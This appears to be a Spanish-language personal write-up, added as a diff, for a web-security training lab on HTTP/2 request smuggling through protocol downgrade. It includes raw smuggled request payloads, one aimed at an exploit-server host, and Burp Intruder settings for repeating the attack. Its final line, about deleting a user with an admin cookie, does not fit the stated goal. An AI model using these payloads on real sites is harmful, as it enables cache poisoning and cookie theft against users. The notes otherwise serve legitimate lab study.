@@ -1,0 +1,39 @@
+### **Descripción del lab**
+This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
+
+To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling `alert(document.cookie)`. The victim user accesses the home page every 10 seconds.
+
+### Confirmación
+
+Creí que esto iba a servir para que me de un error cuatrocientos cuatro:
+```
+POST / HTTP/2
+Host: 0a8500f0047305298874471500b00006.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+x=
+
+POST /error404 HTTP/1.1 
+Host: exploit-0a6000e504b5054c883146e6019b0075.exploit-server.net/exploit
+
+```
+Pero el problema es que hay dos host, por lo que está reescribiendo al mío. Además es necesarío, para que el alert dure, que la url tenga cache, encontramos un endpoint con cache, pero lleva uid, sin embargo una de las reglas de oro en HTTP smuggling es probar cada uno de los endpoint/path, así 
+```
+POST / HTTP/2
+Host: 0a8500f0047305298874471500b00006.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+
+X=
+GET /resources/js HTTP/1.1
+Host: ecample.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+x=
+```
+Para enviar múltiples veces este ataque utilizamos el intruder
+click derecho send to intruder, configuramos que tenga null payloads y "continue indefinitely".  Vamos a resource pool y le damos a create new resource pool, También en la pestaña de resource pool, para setear el Maximun concurrent request en 1, y el delay de las solicitudes 800 milisegundos. Podemos filtrar las respuestas por las que sean válidas o 300, redirección, en "selected items". Y en settings, sacarle el update content-length
+Ponemos la Cookie de sision de admin y borramos a Carlos
+
